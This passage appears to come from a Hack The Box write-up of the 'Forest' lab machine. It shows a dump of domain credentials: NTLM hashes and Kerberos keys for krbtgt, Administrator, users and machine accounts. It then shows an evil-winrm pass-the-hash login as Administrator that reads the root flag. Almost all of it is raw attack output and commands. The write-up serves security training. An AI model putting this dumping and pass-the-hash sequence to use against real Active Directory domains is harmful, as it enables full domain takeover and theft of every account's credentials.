htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
miguel:9601:aad3b435b51404eeaad3b435b51404ee:a5d00adb6dfe29ef13ae455a35ddec78:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:142956afd03cfb663885c87412feab75:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
miguel:aes256-cts-hmac-sha1-96:c082f34484cf7a8c4fafed3cb3fab456551438f400e8a836fe30e9a3a2b3a198
miguel:aes128-cts-hmac-sha1-96:0a35c924365ab52d452d8888e8406463
miguel:des-cbc-md5:ad2967864f0ba4ab
FOREST$:aes256-cts-hmac-sha1-96:04af0b7895e8e4203acc82fd2b98f3084ca35e75977c18481fe386a6b43dd74f
FOREST$:aes128-cts-hmac-sha1-96:77d766d46c2c692a2c9e0e16fb4d22ce
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

## Root flag && Shell as Administrator 

```bash
❯ evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
22123ef2e8b61fe523663bcbb7f231e8
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```



